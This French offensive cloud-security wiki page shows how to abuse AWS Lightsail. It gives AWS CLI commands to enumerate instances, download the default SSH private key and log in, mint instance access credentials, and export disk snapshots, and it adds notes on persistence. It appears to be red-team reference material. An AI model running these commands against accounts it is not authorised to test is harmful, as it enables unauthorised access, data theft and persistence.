---
order: 9
title: "Lightsail : instances et snapshots hors de la visibilité IAM"
description: "Abuser des instances, clés et snapshots Lightsail qui restent hors du VPC principal et de la visibilité IAM."
keywords:
  - Lightsail
  - instance
  - clé SSH
  - snapshot
  - VPS
---

# Lightsail

Lightsail est le produit VPS simplifié d'AWS. Il fait tourner des instances, des bases de données et des snapshots sur un plan parallèle que les équipes oublient d'auditer, avec sa propre gestion de clés et sans rôle de profil d'instance. Cet angle mort est précisément l'intérêt : les ressources Lightsail sont souvent absentes de la revue VPC et IAM de l'organisation, et le service distribue des clés SSH par défaut et permet de prendre des snapshots et d'exporter des disques.

## Énumérer et prendre le contrôle

```bash
aws lightsail get-instances --query 'instances[].{n:name,ip:publicIpAddress}'

# Download the account default key pair and SSH in
aws lightsail download-default-key-pair --query privateKeyBase64 --output text | base64 -d > key.pem
chmod 600 key.pem ; ssh -i key.pem ec2-user@<public-ip>

# Or mint temporary access to a specific instance (private key + cert) with no key download
aws lightsail get-instance-access-details --instance-name <n> \
  --query '{k:accessDetails.privateKey,c:accessDetails.certKey,u:accessDetails.username}'

# Snapshot a disk to read it, or export a snapshot to EC2
aws lightsail create-instance-snapshot --instance-name <n> --instance-snapshot-name s
aws lightsail export-snapshot --source-snapshot-name s
```

## Notes d'exploitation

- La paire de clés par défaut du compte ouvre chaque instance lancée avec elle, de sorte qu'un seul téléchargement peut donner un accès étendu.
- Exporter un snapshot Lightsail le déplace vers EC2 sous forme d'AMI ou de snapshot EBS, où il peut être monté et lu hors ligne.
- Les bases de données Lightsail détiennent leurs propres credentials et sont atteignables sur des endpoints publics lorsqu'elles sont ouvertes, indépendamment des contrôles VPC.
- Les instances Lightsail n'ont pas de rôle de profil d'instance, il n'y a donc aucun credential IMDS à voler sur la machine ; l'accès est entièrement basé sur les clés, c'est pourquoi la paire de clés par défaut et `GetInstanceAccessDetails` sont les leviers.
- Ce même modèle de clés est un point d'ancrage pour la persistance : la clé par défaut téléchargée continue d'ouvrir chaque instance lancée avec elle, et `GetInstanceAccessDetails` peut être réexécuté à volonté tant que la permission IAM reste en place, survivant à une reconstruction d'instance.

## Outils

- **AWS CLI** (`lightsail get-instances`, `download-default-key-pair`, `export-snapshot`).

## Références

- [AWS: Lightsail key pairs](https://docs.aws.amazon.com/lightsail/latest/userguide/understanding-public-key-based-ssh-keys-in-amazon-lightsail.html)
- [HackTricks Cloud: AWS services](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
